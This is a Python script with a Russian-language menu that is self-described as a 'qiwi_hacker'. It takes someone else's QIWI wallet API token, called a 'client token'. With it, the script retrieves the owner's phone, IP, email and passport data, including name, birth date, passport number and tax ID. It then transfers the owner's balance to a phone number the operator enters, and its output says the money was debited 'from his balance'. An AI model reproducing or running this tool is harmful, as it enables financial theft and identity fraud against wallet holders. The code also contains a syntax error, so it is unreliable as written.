from SimpleQIWI import *
import os, sys
import time

try:import requests
    from requests import api
except ImportError:
    errMsg("[ requests ] Модуль не установлен")
    print("    [*] Команда для установки pip install requests")
    sys.exit(1)

nu = '\033[0m'
re = '\033[1;31m'
gr = '\033[1;32m'
cy = '\033[1;36m'

class extra():
    def write(in_text):
        for char in in_text:
            time.sleep(0.1)
            sys.stdout.write(char)
            sys.stdout.flush()

os.system("clear")
extra.write(f"{re}[!]{nu} Для использования сбора информации с QIWI используйте SimpleQIWI\n")
extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
os.system("clear")


def information_QIWI_Wallet():
    try:
        token = input("Введите ваш токен: ")

        if token == "":
            print(f"{re}[!]{nu} Введите токен!")
            quit()
        os.system("clear")
        session = requests.Session()
        session.headers['Accept']= 'application/json'
        session.headers['authorization'] = 'Bearer ' + token
        req = session.get("https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true").json()
        print("[🔔] Информация получена")
        api = QApi(token=token, phone="+" + str(req['contractInfo']['contractId']))
        print("Токен клиента: "+ token)
        print("Баланс: "+ str(api.balance[0]))
        print("Номер телефона: +" + str(req['contractInfo']['contractId']) + " (" + req["userInfo"]["operator"] + ")")
        print("Никнейм: qiwi.com/n/" + req['contractInfo']["nickname"]["nickname"])
        print("Дата создания кошелька: " + req['contractInfo']['creationDate'])
        print("IP: " + req["authInfo"]["ip"])
        print("Привязаная почта: " + req["authInfo"]["boundEmail"])
        print("")
        start()
    except:
       print("[⚠️] Произошла ошибка")
       print("")
       start()
def information_QIWI_Client_passport():
    try:
        token = input("Введите ваш токен: ")

        if token == "":
            print(f"{re}[!]{nu} Введите токен!")
            quit()
        os.system("clear")
        session = requests.Session()
        session.headers['Accept']= 'application/json'
        session.headers['authorization'] = 'Bearer ' + token
        req = session.get("https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true").json()
        req2 = session.get("https://edge.qiwi.com/identification/v1/persons/" + str(req['contractInfo']['contractId']) + "/identification").json()
        print("[🔔] Паспортные данные")
        print("ФИО: " + req2["firstName"] + " " + req2["lastName"])
        print("Дата рождения: " + req2["birthDate"])
        print("Серия и номер: " + req2["passport"])
        print("ИНН: " + req2["inn"])
        print("")
        start()
    except:
       print("[⚠️] Произошла ошибка при получении паспортных данных")
       print("")
       start()
def Withdraw_money():
    client_token = input("Введите токен клиента: ")
    os.system("clear")
    if client_token == None:
        quit()
    elif client_token == "":
        quit()
    else:
        exit
    try:
        api_Client = QApi(token=client_token, phone="")
        print('')
        print('Balance: '+ str(api_Client.balance[0]) +' ₽')
        print('')
        print('Внимани для перевода средств должны быть\nвключени все розрешения для api токена.')
        phone = input("Введите свой номер в формате +380: ")
        money = input('Введите сумму: ')
        comment = input('Напишите комментарий (Не обязательно): ')
        if api_Client.balance[0] < money:
            os.system("clear")
            print('У этого пользователя не достаточно денег.')
            print("")
            start()
        elif api_Client.balance[0] >= money:
            api_Client.pay(account=phone, amount=money, comment=comment)
        else:
            print("Что-то пошло не так :(")
        print('')
        print("""У пользователя осталось: """+ str(api_Client.balance[0]) +"""₽
--------------------
Вы списали с его баланса: """+ str(money) +"""
Переведено на номер: """+ str(phone) +"""
Вы оставили коментарий: """+ str(comment) +"""
""")
        print("")
        start()
    except:
        print("Произошла неожиданая ошибка!")
        print("""
Причина по которым могла произойти ошибка.
1. Не все розрешение на токене.
2. Возможно токен сменили.
3. Возможно что служба РФ ограничила доступ к QIWI кошельку даже клиенту.
""")
        print("")
        start()


def start():
    version_to_qiwi_hacker = "1.0.3"
    print(f"{re}VERSION ["+ str(version_to_qiwi_hacker) +"]{nu}")
    print(f"{re}!Выберите число!{nu}")
    print(f"""
{re}[1.]{nu} Вывести
{re}[2.]{nu} Узнать паспортные данные
{re}[3.]{nu} Узнать информацию о QIWI кошельке
{re}[4.]{nu} Очистить терминал
{re}[5.]{nu} Обновить репозиторий
{re}[6.]{nu} Остановить операцию
""")
    function_number = input("Введите число: ")
    if function_number == "1":
        Withdraw_money()
    elif function_number == "2":
        information_QIWI_Client_passport()
    elif function_number == "3":
        information_QIWI_Wallet()
    elif function_number == "4":
        os.system("clear")
        start()
    elif function_number == "5":
        version = "1.0.3"
        print("Обновление текущая версия " + str(version))
        extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
        os.system("bash ./.upgrade.sh")
    elif function_number == "6":
        os.system("clear")
        print("Завершение роботы файла.")
        extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
        os.system("clear")
        os.system("cd")
        os.system("clear")
start()
